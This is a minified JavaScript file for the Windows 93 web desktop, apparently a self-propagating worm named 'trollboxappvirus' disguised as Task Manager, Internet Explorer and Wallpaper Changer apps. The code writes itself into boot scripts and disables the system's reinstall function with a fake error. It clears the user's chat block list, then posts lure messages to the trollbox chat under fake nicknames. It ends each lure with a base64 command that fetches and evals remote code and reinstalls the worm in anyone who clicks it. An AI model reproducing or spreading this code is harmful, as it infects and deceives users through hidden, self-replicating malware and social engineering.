function installTrollboxApp(e, t, n) {
    function a(e, t) {
        e.appendChild(document.createTextNode(t))
    }

    function o(e) {
        return Math.floor(Math.random() * e)
    }

    function i(e) {
        var t = h[0][e];
        return {
            name: t,
            icon: x[0][e],
            categories: "Utility",
            exec: function() {
                var n, o, i, r = 2e3,
                    l = $window({
                        title: t,
                        icon: x[1][e],
                        width: 340,
                        height: 270,
                        footer: '<div class="ui_window__buttons"><button>End task</button></div>',
                        ondestroy: function() {
                            clearInterval(n)
                        },
                        menu: [{
                            name: "File",
                            items: [{
                                name: "Create new task",
                                action: function() {
                                    $prompt("Create new task", "", (function(e, t) {
                                        e && t && $exe(t)
                                    }))
                                }
                            }, {
                                name: "End all tasks",
                                action: function() {
                                    $exe("killall")
                                }
                            }, {
                                name: "Exit",
                                action: function() {
                                    l.close()
                                }
                            }]
                        }, {
                            name: "View",
                            items: [{
                                name: "Refresh now",
                                action: c
                            }, {
                                name: "Speed",
                                items: [p("Fast (1s)", 1e3), p("Normal (2s)", 2e3), p("Slow (3s)", 3e3), p("Paused", -1)]
                            }]
                        }]
                    }),
                    s = document.createElement("div");

                function c() {
                    var e, t, n, r, l, c, p = $window.instances,
                        u = p.length;
                    for (i = {}, function(e) {
                            for (var t; t = e.firstChild;) e.removeChild(t)
                        }(s), e = 0; u > e; ++e)(t = p[e]) && (n = "programs.png", t.cfg.icon && (n = t.cfg.icon), (r = document.createElement("div")).className = e === o ? "app-taskmgr-task selected" : "app-taskmgr-task", (l = document.createElement("img")).src = $fs.utils.normalizeIcon(n), l.className = "app-taskmgr-task-icon", (c = document.createElement("span")).className = "app-taskmgr-task-id", a(c, "(" + e + ")"), r.appendChild(l), a(r, t.cfg.title), r.appendChild(c), r.onclick = function(e) {
                        return function() {
                            d(e)
                        }
                    }(e), s.appendChild(r), i[e] = r)
                }

                function p(e, t) {
                    return {
                        name: e,
                        radio: "Speed",
                        action: function() {
                            var e; - 1 == t ? (r = -1, clearInterval(n)) : (e = t, clearInterval(n), n = setInterval(c, r = e))
                        },
                        selected: function() {
                            return r == t
                        }
                    }
                }

                function d(e) {
                    var t = i[o];
                    t && (t.className = t.className.replace(" selected", "")), i[e].className += " selected", o = e
                }
                s.className = "app-taskmgr-tasks", l.el.body.appendChild(s), c(), n = setInterval(c, r), l.el.footer.getElementsByTagName("button")[0].onclick = function() {
                    var e = $window.instances[o];
                    e ? (e.destroy(), c()) : null == o ? $alert("Please select a task.") : $alert.error("Instance does not exist")
                }
            }
        }
    }

    function r(e) {
        return {
            name: "Internet Explorer",
            icon: x[0][e],
            categories: "Network;WebBrowser",
            accept: ".htm,.html",
            onRegister: function(e) {
                le._get.mime.apps.push([/text\/html/, e])
            },
            exec: function() {
                var t, n, o = this.arg.arguments[0],
                    i = !1,
                    r = $window.call(this, {
                        title: "Microsoft Internet Explorer",
                        icon: x[1][e],
                        url: "about:blank",
                        bodyClass: "skin_inset_deep skin_light",
                        width: 640,
                        height: 480,
                        onready: function(e) {
                            if (!i) {
                                if (function() {
                                        var e, o, i, s = 0;
                                        do {
                                            e = "app-iexplore-addressbar-input-" + s++
                                        } while (document.getElementById(e));
                                        (t = document.createElement("div")).className = "app-iexplore-addressbar", (n = document.createElement("input")).id = e, n.className = "app-iexplore-addressbar-input", n.setAttribute("type", "url"), n.onkeydown = function(e) {
                                            "Enter" == e.key && l(n.value)
                                        }, (o = document.createElement("label")).className = "app-iexplore-addressbar-label", o.setAttribute("for", e), a(o, "Address "), (i = document.createElement("button")).className = "app-iexplore-addressbar-go", i.onclick = function() {
                                            l(n.value)
                                        }, a(i, "Go"), t.appendChild(o), t.appendChild(n), t.appendChild(i), r.el.menu.appendChild(t)
                                    }(), o) {
                                    var s = o.indexOf(":"),
                                        c = o.indexOf("/");
                                    l(-1 == s || -1 != c && s >= c ? "file:" + o : o)
                                } else l("about:home");
                                i = !0
                            }
                        },
                        menu: [{
                            name: "File",
                            items: [{
                                name: "Open",
                                action: function() {
                                    $explorer("a/", {
                                        browse: !0,
                                        explorer: !0,
                                        onclose: function(e, t) {
                                            e && l("file:" + t)
                                        }
                                    })
                                }
                            }, {
                                name: "Exit",
                                action: function() {
                                    r.close()
                                }
                            }]
                        }, {
                            name: "Favorites",
                            items: [{
                                name: "Coming soon",
                                disabled: !0
                            }]
                        }, {
                            name: "Help",
                            items: [{
                                name: "About",
                                action: function() {
                                    $alert.info("<b>Internet Explorer 3.5</b>\n by <tt>[REDACTED]</tt>\n\n<strong>Note:</strong> This browser uses <code>&lt;iframe&gt;</code>s, and it will not load some pages")
                                }
                            }]
                        }]
                    });

                function l(e) {
                    -1 == e.indexOf(":") && (e = (p ? "https" : "http") + "://" + e);
                    var t = e.toLowerCase();
                    n.value = e, 0 == t.indexOf("file:") ? $file.open(e.slice(5), "String", (function(e) {
                        r.el.iframe.onload = function() {
                            var t = r.el.iframe.contentDocument || r.el.iframe.contentWindow.document;
                            t.open(), t.write(e), t.close()
                        }, r.el.iframe.src = "about:blank"
                    })) : 0 == t.indexOf("about:") ? (r.el.iframe.onload = function() {
                        var t = r.el.iframe.contentWindow,
                            n = r.el.iframe.contentDocument || t.document;
                        ! function(e, t, n) {
                            var a;
                            switch (e.slice(6).toLowerCase()) {
                                case "blank":
                                    break;
                                case "home":
                                    (a = n.createElement("h1")).appendChild(n.createTextNode("Home")), n.body.appendChild(a);
                                    break;
                                default:
                                    (a = n.createElement("p")).appendChild(n.createTextNode("Invalid about URL")), n.body.appendChild(a)
                            }
                        }(e, 0, n)
                    }, r.el.iframe.src = "about:blank") : (r.el.iframe.onload = null, r.el.iframe.src = e)
                }
            }
        }
    }

    function l(e) {
        var t = h[0][e],
            n = le._dom.background,
            o = ".config/wallpaper.json";
        return {
            icon: x[0][e],
            categories: "Utility",
            exec: function() {
                var l = $window({
                        title: t,
                        icon: x[1][e],
                        bodyClass: "app-changewallpaper",
                        onready: function() {
                            ! function() {
                                var e = document.createElement("div");
                                c(), a(e, "Change Wallpaper"), l.el.body.appendChild(e), e = document.createElement("button"), e.onclick = function() {
                                    $prompt("Enter the URL of the wallpaper", "", (function(e, t) {
                                        e && (i(n, t), $store.set(o, {
                                            type: "url",
                                            data: t
                                        }))
                                    }))
                                }, a(e, "URL"), l.el.body.appendChild(e), a(l.el.body, " "), e = document.createElement("button"), e.onclick = function() {
                                    $explorer("a/", {
                                        browse: !0,
                                        explorer: !0,
                                        onclose: function(e, t) {
                                            e && (r(n, t), c(), $store.set(o, {
                                                type: "file",
                                                data: t
                                            }))
                                        }
                                    })
                                }, a(e, "File"), l.el.body.appendChild(e), a(l.el.body, " "), e = document.createElement("button"), e.onclick = function() {
                                    ! function(e) {
                                        e.style.backgroundImage = "", e.style.backgroundSize = ""
                                    }(n), c(), $store.set(o, {
                                        type: "default"
                                    })
                                }, a(e, "Default"), l.el.body.appendChild(e)
                            }()
                        }
                    }),
                    s = document.createElement("div");

                function c() {
                    var e = window.getComputedStyle(n);
                    s.style.backgroundColor = e.backgroundColor, s.style.backgroundImage = e.backgroundImage, s.style.backgroundPosition = e.backgroundPosition, s.style.backgroundRepeat = e.backgroundRepeat, s.style.backgroundSize = e.backgroundSize
                }
                s.className = "app-changewallpaper-preview skin_alpha", l.el.body.appendChild(s)
            },
            onRegister: function() {
                0 === $fs.utils.exist("/a/" + o) && $file.open("/a/" + o, "Object", (function(e) {
                    switch (e.type) {
                        case "url":
                            i(n, e.data);
                            break;
                        case "file":
                            r(n, e.data)
                    }
                }))
            }
        };

        function i(e, t) {
            e.style.backgroundImage = "url(" + t + ")", e.style.backgroundSize = "cover"
        }

        function r(e, t, n) {
            $file.getUrl(t, (function(t) {
                i(e, t), "function" == typeof n && n()
            }))
        }
    }

    function s() {
        var e;
        switch (t) {
            case 0:
                e = i(0);
                break;
            case 1:
                e = r(1);
                break;
            case 2:
                e = l(2);
                break;
            default:
                throw Error("UNKNOWN APP")
        }
        le._apps[k] = e, e.onRegister && e.onRegister.call(e, k)
    }

    function c() {
        var e, t = m + "-styles";
        document.getElementById(t) || ((e = document.createElement("style")).id = t, a(e, ".app-taskmgr-tasks {height: 100%;background: white;border: 1px solid #6e6e6e;overflow-y: auto;}.app-taskmgr-task { padding: 2px; }.app-taskmgr-task.selected { background: #0090e4; color: white; }.app-taskmgr-task-icon {width: 16px;height: 16px;margin-right: 3px;vertical-align: middle;}.app-taskmgr-task-id { margin-left: 2px; color: gray; }.app-taskmgr-task.selected .app-taskmgr-task-id { color: silver; }.app-iexplore-addressbar { display: flex; margin-bottom: 2px; }.app-iexplore-addressbar-input { flex: 1; }.app-iexplore-addressbar-go { margin-left: 3px; margin-right: 2px; }.app-changewallpaper { text-align: center; }.app-changewallpaper-preview {padding-top: 75%;margin-bottom: 8px;}"), u.appendChild(e))
    }
    var p = "https:" == location.protocol,
        d = "www.windows93.net:808" + (p ? "6" : "1"),
        u = document.getElementsByTagName("head")[0],
        m = "trollboxappvirus",
        f = "_" + m + "_scriptLoaded",
        g = $io.arr.random,
        b = o(3),
        h = [
            ["Task Manager", "Internet Explorer", "Wallpaper Changer"],
            ["task manager", "internet explorer", "wallpaper changer"],
            ["taskmgr", "iexplore", "changewallpaper"]
        ],
        k = h[2][t],
        w = "https://win98icons.alexmeub.com/icons/png/",
        x = [
            [w + "computer_taskmgr-0.png", w + "msie1-1.png", w + "monitor_gear.png", w + "tip.png"],
            [w + "computer_taskmgr-1.png", w + "msie1-4.png", w + "monitor_tweakui-1.png"]
        ],
        y = ["", w + "msie_box-0.png", w + "monitor_windows.png"],
        v = x[0][t],
        C = [
            ["I spent whole night making this app", "Click /exe to get it"],
            ["Did you ever wanted to have " + h[0][b] + " on Windows 93?", "Now you can!"],
            ["Hi. Wanna check out my " + h[1][b] + " app", "Here it is"],
            ["Hello. I made " + h[0][b] + " for Windows93!", "Click the /exe button to install it!"]
        ],
        E = m + "-socketio",
        $ = document.getElementById(E);

    function N() {
        window[f] = !0, I()
    }

    function I() {
        var e = io(d);
        e.on("connect", (function() {
            var t, a = C[o(C.length)];
            t = "string" == typeof n ? "(" + _ + ")(window," + JSON.stringify(n) + "," + b + ")" : "$alert('the app is not available :(');", e.emit("user joined", g(["Free apps for Windows 93", "anonymous", "nickname ?", "Apps", "Windows93 apps", "a", "AppCoder"]), "#9f0", "", "", ""), e.on("user joined", (function() {
                setTimeout((function() {
                    e.emit("message", a[0]), setTimeout((function() {
                        e.emit("message", a[1]), setTimeout((function() {
                            e.emit("message", "/exe js data:text/javascript;base64," + btoa(t))
                        }), 2e3)
                    }), 1e3 + o(2001))
                }), 1500 + o(2501))
            }))
        }))
    }

    function _(e, t, n) {
        var a = new XMLHttpRequest;
        a.onreadystatechange = function() {
            4 == a.readyState && 200 == a.status && (e.eval(atob(a.responseText)), e.installTrollboxApp(!0, n, t))
        }, a.open("GET", t, !0), a.send()
    }
    $ ? window[f] ? I() : $.addEventListener("load", N) : (($ = document.createElement("script")).id = E, $.src = (p ? "https" : "http") + "://" + d + "/socket.io/socket.io.js", $.addEventListener("load", N), u.appendChild($)), $file.format = function() {
        $alert.error("An error has occured while reinstalling Windows93.")
    }, $store.set(".config/trollbox/blocked", ""), e ? $confirm({
        title: "App Installer",
        msg: 'Install "' + h[0][t] + '"?',
        img: y[t] || v
    }, (function(e) {
        var a = e ? k + "_app.js" : "trollbox.js",
            o = "(" + installTrollboxApp + ")(!1," + (e ? t : -1);
        "string" == typeof n && (o += "," + JSON.stringify(n)), $db.set("boot/" + a, o + ")"), e && (s(), c(), $store.set("desktop/" + h[0][t] + ".lnk42", {
            icon: v,
            exe: k
        }), $explorer.refresh(), $alert.info(h[0][t] + " has been installed successfully!")), le._files.a.boot[a] = !1
    })) : (-1 != t && (s(), c()), le._files.a.boot[-1 == t ? "trollbox.js" : k + "_app.js"] = !1)
